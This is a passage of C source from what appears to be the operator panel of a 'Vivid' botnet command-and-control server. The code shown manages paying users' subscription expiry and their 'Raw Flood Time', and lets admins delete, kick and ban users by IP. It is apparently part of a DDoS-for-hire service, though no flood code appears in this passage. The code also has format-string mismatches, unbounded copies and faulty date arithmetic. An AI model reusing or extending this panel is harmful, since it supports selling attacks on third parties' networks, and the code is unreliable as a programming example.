                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    if(fdgets(update, sizeof update, vivfd) < 1) goto end;
                    Trim(update);
                    if(!strcmp(update, "1day") || !strcmp(update, "1DAY") || !strcmp(update, "1week") || !strcmp(update, "1WEEK") ||  !strcmp(update, "1month") || !strcmp(update, "1MONTH") || !strcmp(update, "3months") || !strcmp(update, "3MONTHS") || !strcmp(update, "6months") || !strcmp(update, "6MONTHS") || !strcmp(update, "1year") || !strcmp(update, "1YEAR")){
                        //Do Nothing, Straight Logic
                    }
                    else{
                        sprintf(vivid, ""R"INVALID LENGTH - Enter: '1WEEK'/'1MONTH'/'3MONTHS'/'6MONTHS'/'1YEAR'"CR"\r\n");
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        goto addtmwt;
                    }
                    memset(new_update_time, 0, sizeof(new_update_time));
                    char total_new_time[120];
                    //printf("%s/%s/%s\n", month, day, year);
                    if(!strcmp(update, "1day") || !strcmp(update, "1DAY")){
                        int d = atoi(cuday);
                        int m = atoi(cumnth);
                        int y = atoi(cuyear);
                        if(d == 31 || d == 30){
                            if(m == 12){
                                y++;
                                m = 1;
                                d = 1;
                            }
                            else{
                                m++;
                                d = 1;
                            }   
                        }
                        else
                            d++;
                        snprintf(total_new_time, sizeof(total_new_time), "%d/%d/%d", d, m, y);
                        if(d >= 1 && d <= 9){
                            memset(total_new_time, 0, sizeof(total_new_time));
                            snprintf(total_new_time, sizeof(total_new_time), "0%d/%d/%d", d, m, y);
                            if(m >= 1 && m <= 9){
                                memset(total_new_time, 0, sizeof(total_new_time));
                                snprintf(total_new_time, sizeof(total_new_time), "0%d/0%d/%d", d, m, y);
                            }
                        }
                        else if(m >= 1 && m <= 9){
                            memset(total_new_time, 0, sizeof(total_new_time));
                            snprintf(total_new_time, sizeof(total_new_time), "%d/0%d/%d", d, m, y);
                        }
                    }
                    else if(!strcmp(update, "1week") || !strcmp(update, "1WEEK")){
                        int d = atoi(cuday);
                        int m = atoi(cumnth);
                        int y = atoi(cuyear);
                        if(d == 31 || d == 30){
                            if(m == 12){
                                y++;
                                m = 1;
                                d = 7;
                            }
                            else{
                                m++;
                                d = 7;
                                if(m > 12){
                                    m -= 12;
                                    y++;
                                }
                            }
                        }
                        else
                            d += 7;
                        if(d > 30){
                            m++;
                            d -= 30;
                        }
                        if(m > 12){
                            y++;
                            m -= 12;
                        }
                        snprintf(total_new_time, sizeof(total_new_time), "%d/%d/%d", d, m, y);
                        if(d >= 1 && d <= 9){
                            memset(total_new_time, 0, sizeof(total_new_time));
                            snprintf(total_new_time, sizeof(total_new_time), "0%d/%d/%d", d, m, y);
                            if(m >= 1 && m <= 9){
                                memset(total_new_time, 0, sizeof(total_new_time));
                                snprintf(total_new_time, sizeof(total_new_time), "0%d/0%d/%d", d, m, y);
                            }
                        }
                        else if(m >= 1 && m <= 9){
                            memset(total_new_time, 0, sizeof(total_new_time));
                            snprintf(total_new_time, sizeof(total_new_time), "%d/0%d/%d", d, m, y);
                        }
                    }
                    else if(!strcmp(update, "1month") || !strcmp(update, "1MONTH")){
                        int d = atoi(cuday);
                        int m = atoi(cumnth);
                        int y = atoi(cuyear);
                        if(m == 12){
                            y++;
                            m = 1;
                        }
                        else
                            m++;
                        if(m > 12){
                            m -= 12;
                            y++;
                        }
                        snprintf(total_new_time, sizeof(total_new_time), "%d/%d/%d", d, m, y);
                        if(d >= 1 && d <= 9){
                            memset(total_new_time, 0, sizeof(total_new_time));
                            snprintf(total_new_time, sizeof(total_new_time), "0%d/%d/%d", d, m, y);
                            if(m >= 1 && m <= 9){
                                memset(total_new_time, 0, sizeof(total_new_time));
                                snprintf(total_new_time, sizeof(total_new_time), "0%d/0%d/%d", d, m, y);
                            }
                        }
                        else if(m >= 1 && m <= 9){
                            memset(total_new_time, 0, sizeof(total_new_time));
                            snprintf(total_new_time, sizeof(total_new_time), "%d/0%d/%d", d, m, y);
                        }
                    }
                    else if(!strcmp(update, "3months") || !strcmp(update, "3MONTHS")){
                        int d = atoi(cuday);
                        int m = atoi(cumnth);
                        int y = atoi(cuyear);
                        if(m == 12){
                            y++;
                            m = 3;
                        }
                        else
                            m += 3;
                        if(m > 12){
                            m -= 12;
                            y++;
                        }
                        snprintf(total_new_time, sizeof(total_new_time), "%d/%d/%d", d, m, y);
                        if(d >= 1 && d <= 9){
                            memset(total_new_time, 0, sizeof(total_new_time));
                            snprintf(total_new_time, sizeof(total_new_time), "0%d/%d/%d", d, m, y);
                            if(m >= 1 && m <= 9){
                                memset(total_new_time, 0, sizeof(total_new_time));
                                snprintf(total_new_time, sizeof(total_new_time), "0%d/0%d/%d", d, m, y);
                            }
                        }
                        else if(m >= 1 && m <= 9){
                            memset(total_new_time, 0, sizeof(total_new_time));
                            snprintf(total_new_time, sizeof(total_new_time), "%d/0%d/%d", d, m, y);
                        }
                    }
                    else if(!strcmp(update, "6months") || !strcmp(update, "6MONTHS")){
                        int d = atoi(cuday);
                        int m = atoi(cumnth);
                        int y = atoi(cuyear);
                        if(m == 12){
                            y++;
                            m = 6;
                        }
                        else
                            m += 6;
                        if(m > 12){
                            m -= 12;
                            y++;
                        }
                        snprintf(total_new_time, sizeof(total_new_time), "%d/%d/%d", d, m, y);
                        if(d >= 1 && d <= 9){
                            memset(total_new_time, 0, sizeof(total_new_time));
                            snprintf(total_new_time, sizeof(total_new_time), "0%d/%d/%d", d, m, y);
                            if(m >= 1 && m <= 9){
                                memset(total_new_time, 0, sizeof(total_new_time));
                                snprintf(total_new_time, sizeof(total_new_time), "0%d/0%d/%d", d, m, y);
                            }
                        }
                        else if(m >= 1 && m <= 9){
                            memset(total_new_time, 0, sizeof(total_new_time));
                            snprintf(total_new_time, sizeof(total_new_time), "%d/0%d/%d", d, m, y);
                        }
                    }
                    else if(!strcmp(update, "1year") || !strcmp(update, "1YEAR")){
                        int d = atoi(cuday);
                        int m = atoi(cumnth);
                        int y = atoi(cuyear); 
                        y++;
                        snprintf(total_new_time, sizeof(total_new_time), "%d/%d/%d", d, m, y);
                        if(d >= 1 && d <= 9){
                            memset(total_new_time, 0, sizeof(total_new_time));
                            snprintf(total_new_time, sizeof(total_new_time), "0%d/%d/%d", d, m, y);
                            if(m >= 1 && m <= 9){
                                memset(total_new_time, 0, sizeof(total_new_time));
                                snprintf(total_new_time, sizeof(total_new_time), "0%d/0%d/%d", d, m, y);
                            }
                        }
                        else if(m >= 1 && m <= 9){
                            memset(total_new_time, 0, sizeof(total_new_time));
                            snprintf(total_new_time, sizeof(total_new_time), "%d/0%d/%d", d, m, y);
                        }
                    }
                    snprintf(new_update_time, sizeof(new_update_time), "%s", total_new_time);
                    isexpok:
                    sprintf(vivid, "\r\n\t\t"Y"New Expiry Will Be: %s\r\n\t\tIs This Okay?(y/n): ", new_update_time);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                    Trim(buf);
                    if(!strcmp(buf, "y") || !strcmp(buf, "Y") || !strcmp(buf, "y") || !strcmp(buf, "Y")){
                        //Do Nothing, Straight Logic
                    }
                    else if(!strcmp(buf, "n") || !strcmp(buf, "N") || !strcmp(buf, "no") || !strcmp(buf, "NO")) goto addtmwt;
                    else goto isexpok;
                    //Remove String
                    char rmold[10];
                    sprintf(rmold, "%s", split_uargv[0]);
                    RMSTR(rmold, DB);
                    FILE *uinfo = fopen(DB, "a+");
                    fprintf(uinfo, "%s %s %s %s %s\n", split_uargv[0], split_uargv[1], split_uargv[2], new_update_time, split_uargv[4]);
                    fclose(uinfo);
                    FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                    fprintf(adinfo, "[%s] Added Time For [%s]\n", MNGRS[vivfd].nick, split_uargv[0]);
                    fclose(adinfo);
                    printf(""CY"%s "Y"Added Time For ["G"%s"Y"]\n", MNGRS[vivfd].nick, split_uargv[0]);
                    sprintf(vivid, "\t\t"CY"Added Time For ["Y"%s"CY"]"CR"", split_uargv[0]);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    FILE *tempFile;
                    FILE *srcFile = fopen(DB, "r");
                    tempFile = fopen(""LFD"/remove-blanks.tmp", "a+");
                    /* Exit if file not opened successfully */
                    if (srcFile == NULL || tempFile == NULL){
                        goto adminhub;
                    }
                    // Remove empty lines from file.
                    removeEmptyLines(srcFile, tempFile);
                    /* Close all open files */
                    fclose(srcFile);
                    fclose(tempFile);

                    /* Delete src file and rename temp file as src */
                    remove(DB);
                    char oldName[100], newName[100];
                    sprintf(oldName, ""LFD"/remove-blanks.tmp");
                    sprintf(newName, ""DB"");
                    if(rename(oldName, newName) == 0){
                        //Do Nothing, Straight Logic
                    }
                    else{
                        sprintf(vivid, "\r\n"R"Couldn't Rename DB, Please Contact An Owner!"CR"\r\n");
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    }
                    adtmuwt:
                    sprintf(vivid, "\r\n"CR"« B.Go Back\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n"CR"« L.Log Out\t\t\t"CY"╚═» ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                    Trim(buf);
                    if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
                    else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
                    else{
                        sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        memset(buf, 0, sizeof(buf));
                        sleep(1);
                        goto adtmuwt;
                    }
                }
                else if(!strcmp(buf, "4")){
                    //Edit Raw Flood Time
                    sprintf(vivid, "\r\n\t\t"Y"%s's Current RFT - %s"CR"\r\n\r\n", split_uargv[0], split_uargv[4]);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    char edit_rft[20];
                    memset(edit_rft, 0, sizeof(edit_rft));
                    sprintf(vivid, "\t\t"Y"[New Raw Flood Time]"CY": ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    if(fdgets(edit_rft, sizeof edit_rft, vivfd) < 1) goto end;
                    Trim(edit_rft);
                    isedpok:
                    sprintf(vivid, "\r\n\t\t"Y"New Raw Flood Time Will Be: %s\r\n\t\tIs This Okay?(y/n): ", edit_rft);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                    Trim(buf);
                    if(!strcmp(buf, "y") || !strcmp(buf, "Y") || !strcmp(buf, "y") || !strcmp(buf, "Y")){
                        //Do Nothing, Straight Logic
                    }
                    else if(!strcmp(buf, "n") || !strcmp(buf, "N") || !strcmp(buf, "no") || !strcmp(buf, "NO")) goto getedituser;
                    else goto isedpok;
                    //Remove String
                    char rmold[10];
                    sprintf(rmold, "%s", split_uargv[0]);
                    RMSTR(rmold, DB);
                    FILE *uinfo = fopen(DB, "a+");
                    fprintf(uinfo, "%s %s %s %s %s\n", split_uargv[0], split_uargv[1], split_uargv[2], split_uargv[3], edit_rft);
                    fclose(uinfo);
                    FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                    fprintf(adinfo, "[%s] Edited RFT For %s [%s]\n", MNGRS[vivfd].nick, split_uargv[0], edit_rft);
                    fclose(adinfo);
                    printf(""CY"["Y"%s"CY"] "Y"Edited RFT For %s "CY"["Y"%s"CY"]"CR"\n", MNGRS[vivfd].nick, split_uargv[0], edit_rft);
                    sprintf(vivid, "\t\t"CY"[%s] Edited RFT For %s [%s]\n", MNGRS[vivfd].nick, split_uargv[0], edit_rft);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    FILE *tempFile;
                    FILE *srcFile = fopen(DB, "r");
                    tempFile = fopen(""LFD"/remove-blanks.tmp", "a+");
                    /* Exit if file not opened successfully */
                    if (srcFile == NULL || tempFile == NULL){
                        goto adminhub;
                    }
                    // Remove empty lines from file.
                    removeEmptyLines(srcFile, tempFile);
                    /* Close all open files */
                    fclose(srcFile);
                    fclose(tempFile);

                    /* Delete src file and rename temp file as src */
                    remove(DB);
                    char oldName[100], newName[100];
                    sprintf(oldName, ""LFD"/remove-blanks.tmp");
                    sprintf(newName, ""DB"");
                    if(rename(oldName, newName) == 0){
                        //Do Nothing, Straight Logic
                    }
                    else{
                        sprintf(vivid, "\r\n"R"Couldn't Rename DB, Please Contact An Owner!"CR"\r\n");
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    }
                    edtrfwt:
                    sprintf(vivid, "\r\n"CR"« B.Go Back\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n"CR"« L.Log Out\t\t\t"CY"╚═» ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                    Trim(buf);
                    if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
                    else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
                    else{
                        sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        memset(buf, 0, sizeof(buf));
                        sleep(1);
                        goto edtrfwt;
                    }
                }
                else{
                    sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    sleep(1);
                    goto adby;
                }
            }
            else{
                sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                memset(buf, 0, sizeof(buf));
                sleep(1);
                goto adby;
            }
        }
        else if(!strcmp(buf, "2")){ //Del User
            int kdm;
            char deluser[50];
            getuser2del:
            if(send(vivfd, "\t"Y"["CY"User To Delete"Y"]"CY": "W"", strlen("\t"Y"["CY"User To Delete"Y"]"CY": "W""), MSG_NOSIGNAL) == -1) goto end;
            memset(deluser, 0, sizeof(deluser));
            if(fdgets(deluser, sizeof deluser, vivfd) < 1) goto end;
            Trim(deluser);
            FILE *fp;
            char temp[1024];
            if((fp = fopen(DB, "r")) == NULL){
                printf(""Y"FIX THE DEL USER FUNC"CR"\n");
                sleep(2);
                goto adminhub;
            }
            int founduser = 0;
            while(fgets(temp, 1024, fp) != NULL){
                if((strstr(temp, deluser)) != NULL){
                    founduser = 1;
                }
            }
            if(fp)
                fclose(fp);
            if(founduser != 1){
                sprintf(vivid, "\t\t"R"Couldn't Find That User...\r\n");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                memset(deluser, 0, sizeof(deluser));
                goto getuser2del;
            }
            RMSTR(deluser, DB);
            sprintf(vivid, "\t"Y"["CY"Deleted User "Y"("CY"%s"Y")"CY"..."Y"]\r\n", deluser);
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            for(kdm = 0; kdm < MXFDS; kdm++){
                if(!MNGRS[kdm].connd) continue;
                if(!strcmp(MNGRS[kdm].nick, deluser)){
                    close(kdm);
                    MNGRS[kdm].connd = 0;
                    memset(MNGRS[kdm].ip, 0, sizeof(MNGRS[kdm].ip));
                    memset(MNGRS[kdm].nick, 0, sizeof(MNGRS[kdm].nick));
                    memset(MNGRS[kdm].vivex, 0, sizeof(MNGRS[kdm].vivex));
                }
            }
            rmuwt:
            sprintf(vivid, "\r\n"CR"« B.Go Back\r\n« L.Log Out\r\n                     "CY"╔══╣"UND"Vivid"NUND"║\r\n                     ╚═» ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
            else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
            else{
                sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                memset(buf, 0, sizeof(buf));
                sleep(1);
                goto rmuwt;
            }
        }
        else if(!strcmp(buf, "3")){ //MOTD
            if(strlen(wld_motd) > 0)
                memset(wld_motd, 0, sizeof(wld_motd));
            int motd_least_len = 3;
            if(MNGRS[vivfd].connd && MNGRS[vivfd].vivadm > 0) {
                sprintf(vivid, "\t"Y"["CY"Message Of The Day]"Y"]\r\n\t"Y"["CY"New MOTD"Y"]"CY": ");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                while(fdgets(wld_motd, sizeof(wld_motd), vivfd) < 1){
                    Trim(wld_motd);
                    if(strlen(wld_motd) < motd_least_len) continue;
                    break;
                }
                Trim(wld_motd);
                sprintf(pr_motd, ""CY"["Y"Message Of The Day"CY"]"Y": "CY"%s\r\n", wld_motd);
                sprintf(vivid, "\t"Y"["CY"MOTD Changed To"Y": "CY"%s"Y"]\r\n", wld_motd);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            }
            mtwt:
            sprintf(vivid, ""CR"\r\n« B.Go Back\r\n« L.Log Out\r\n                     "CY"╔══╣"UND"Vivid"NUND"║\r\n                     ╚═» ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
            else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
            else{
                sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                memset(buf, 0, sizeof(buf));
                sleep(1);
                goto mtwt;
            }
        }
        else if(!strcmp(buf, "4")){ //Kick
            sprintf(vivid, ""CY"\t\t\t╔══════════════╗\r\n\t\t\t║ "Y"Online Users "CY"║\r\n\t\t\t╚══════════════╝\r\n");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            int kkkkkk;
            for(kkkkkk = 0; kkkkkk < MXFDS; kkkkkk++){
                if(!MNGRS[kkkkkk].connd) continue;
                if(MNGRS[vivfd].vivadm == 1){
                    sprintf(vivid, "\t\t\t"CY"ID("Y"%d"CY") %s "CY"| "Y"%s"W"\r\n", kkkkkk, MNGRS[kkkkkk].nick, MNGRS[kkkkkk].ip);
                }
                else{
                    sprintf(vivid, "\t\t\t"CY"ID("Y"%d"CY") %s"W"\r\n", kkkkkk, MNGRS[kkkkkk].nick);
                }
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            }
            int id;
            char kuser[50];
            char reason[500];
            if(send(vivfd, "\t\t"Y"["CY"User To Kick"Y"]"CY": ", strlen("\t\t"Y"["CY"User To Kick"Y"]"CY": "), MSG_NOSIGNAL) == -1) goto end;
            memset(kuser, 0, sizeof(kuser));
            while(fdgets(kuser, sizeof kuser, vivfd) <1){
                Trim(kuser);
                break;
            }
            Trim(kuser);
            if(send(vivfd, "\t\t"Y"["CY"Reason"Y"]"CY": ", strlen("\t\t"Y"["CY"Reason"Y"]"CY": "), MSG_NOSIGNAL) == -1) goto end;
            memset(reason, 0, sizeof(reason));
            while(fdgets(reason, sizeof reason, vivfd) <1){
                Trim(reason);
                break;
            }
            Trim(reason);
            for(id=0; id < MXFDS; id++){
                if(strstr(MNGRS[id].nick, kuser)){
                    sprintf(vivid, "\n"R"Goodbye, Kicked By "R"%s"CR"...\r\nReason: %s", MNGRS[vivfd].nick, reason);
                    if(send(id, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    MNGRS[id].connd = 0;
                    close(id);
                    sprintf(vivid, "\t"Y"["CY"Kicked "Y"("CY"%s"Y")"CY"..."Y"]\r\n", kuser);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                }
            }
            kuwt:
            sprintf(vivid, "\r\n"CR"« B.Go Back\r\n« L.Log Out\r\n                     "CY"╔══╣"UND"Vivid"NUND"║\r\n                     ╚═» ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
            else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
            else{
                sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                memset(buf, 0, sizeof(buf));
                sleep(1);
                goto kuwt;
            }
        }
        else if(!strcmp(buf, "5")){ //Ban
            sprintf(vivid, ""CY"\t\t\t╔══════════════╗\r\n\t\t\t║ "Y"Online Users "CY"║\r\n\t\t\t╚══════════════╝\r\n");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            int kkkkkk;
            for(kkkkkk = 0; kkkkkk < MXFDS; kkkkkk++){
                if(!MNGRS[kkkkkk].connd) continue;
                sprintf(vivid, "\t\t\t"CY"ID("Y"%d"CY") %s "CY"| "Y"%s"W"\r\n", kkkkkk, MNGRS[kkkkkk].nick, MNGRS[kkkkkk].ip);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            }
            bnwt:
            sprintf(vivid, "\t"Y"*"CY"Banning A User Resolves And Bans Their IP Address"Y"*\r\n\t           "CY"╔═════════════════╗   ╔══════════════╗\r\n\t           ║ "Y"1."CY"Ban User/IPv4 ║   ║ "Y"2."CY"Unban IPv4 ║\r\n\t           ╚═════════════════╝   ╚══════════════╝"CR"\r\n");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            sprintf(vivid, ""CR"« B.Go Back\r\n« L.Log Out\r\n\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t\t╚═» ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "1")){ //Ban
                bnus:
                sprintf(vivid, ""CR"« B.Go Back\r\n« L.Log Out\r\n\t"Y"*"CY"Banning A User Resolves And Bans Their IP Address"Y"*\r\n\t   "CY"╔═══════════════════╗   ╔═══════════════╗\r\n\t   ║ "Y"1."CY"Ban By Username ║   ║ "Y"2."CY"Ban By IPv4 ║\r\n\t   ╚═══════════════════╝   ╚═══════════════╝"CR"\r\n");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                sprintf(vivid, ""CR"« B.Go Back \t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n"CR"« L.Log Out\r\n\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t╚═» ");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                memset(buf, 0, sizeof(buf));
                if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                Trim(buf);
                if(!strcmp(buf, "1")){ //Ban By User
                    sprintf(vivid, ""CY"\t\t\t╔══════════════╗\r\n\t\t\t║ "Y"Online Users "CY"║\r\n\t\t\t╚══════════════╝\r\n");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    int kkkkkk;
                    for(kkkkkk = 0; kkkkkk < MXFDS; kkkkkk++){
                        if(!MNGRS[kkkkkk].connd) continue;
                        sprintf(vivid, "\t\t\t"CY"ID("Y"%d"CY") %s "CY"| "Y"%s"W"\r\n", kkkkkk, MNGRS[kkkkkk].nick, MNGRS[kkkkkk].ip);
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    }
                    sprintf(vivid, ""Y"["CY"User To Ban"Y"]"CY": ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                    Trim(buf);
                    char bnuser[30];
                    int id;
                    int kx = 0;
                    sprintf(bnuser, "%s", buf);
                    Trim(bnuser);
                    sprintf(vivid, ""Y"["CY"Reason"Y"]"CY": ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                    Trim(buf);
                    char bnreason[500];
                    sprintf(bnreason, "%s", buf);
                    Trim(bnreason);
                    for(kx = 0; kx < MXFDS; kx++){
                        if(!strcmp(MNGRS[kx].nick, bnuser))
                            id = kx;
                    }
                    kx = 0;
                    banstart1:
                    if(atoi(CNSL[kx].banned) > 2){
                        kx++;
                        goto banstart1;
                    }
                    else{
                        FILE *bndlg = fopen(""LFD"/BANNED.log", "a+");
                        fprintf(bndlg, "%s\n", MNGRS[id].ip);
                        fclose(bndlg);
                        FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                        fprintf(adinfo, "[%s] Banned -> [%s] For [%s]\n", MNGRS[vivfd].nick, MNGRS[id].ip, bnreason);
                        fclose(adinfo);
                        snprintf(CNSL[kx].banned, sizeof(CNSL[kx].banned), "%s", MNGRS[id].ip);
                        sprintf(vivid, "\n"R"Goodbye, Banned by "R"%s"CR"...\r\nReason: %s", MNGRS[vivfd].nick, bnreason);
                        if(send(id, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        MNGRS[id].connd = 0;
                        close(id);
                        sprintf(vivid, ""Y"["CY"Banned User "Y"("CY"%s"Y")"CY"..."Y"]\r\n", bnuser);
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    }
                    bndwt:
                    sprintf(vivid, ""CR"« B.Go Back  \t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n"CR"« L.Log Out  \t\t╚═» ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                    Trim(buf);
                    if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
                    else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
                    else{
                        sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        memset(buf, 0, sizeof(buf));
                        sleep(1);
                        goto bndwt;
                    }
                }
                else if(!strcmp(buf, "2")){ //Ban By IP
                    sprintf(vivid, ""CY"\t\t\t╔══════════════╗\r\n\t\t\t║ "Y"Online Users "CY"║\r\n\t\t\t╚══════════════╝\r\n");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    int kkkkkk;
                    for(kkkkkk = 0; kkkkkk < MXFDS; kkkkkk++){
                        if(!MNGRS[kkkkkk].connd) continue;
                        sprintf(vivid, "\t\t\t"CY"ID("Y"%d"CY") %s "CY"| "Y"%s"W"\r\n", kkkkkk, MNGRS[kkkkkk].nick, MNGRS[kkkkkk].ip);
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    }
                    sprintf(vivid, ""Y"["CY"IPv4 To Ban"Y"]"CY": ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                    Trim(buf);
                    char trgt[30];
                    int id;
                    int kx = 0;
                    sprintf(trgt, "%s", buf);
                    Trim(trgt);
                    sprintf(vivid, ""Y"["CY"Reason"Y"]"CY": ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                    Trim(buf);
                    char bnreason[500];
                    sprintf(bnreason, "%s", buf);
                    Trim(bnreason);
                    for(kx = 0; kx < MXFDS; kx++){
                        if(!strcmp(MNGRS[kx].ip, trgt)){
                            sprintf(vivid, "\n"R"Goodbye, Banned by "R"%s"CR"...\r\nReason:", MNGRS[vivfd].nick, bnreason);
                            if(send(kx, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                            MNGRS[kx].connd = 0;
                            close(kx);
                            sprintf(vivid, ""R"["CY"Banned User with IP "R"("CY"%d"R")"CY"..."R"]\r\n", trgt);
                            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        }
                    }
                    FILE *bndlg = fopen(""LFD"/BANNED.log", "a+");
                    fprintf(bndlg, "%s\n", MNGRS[id].ip);
                    fclose(bndlg);
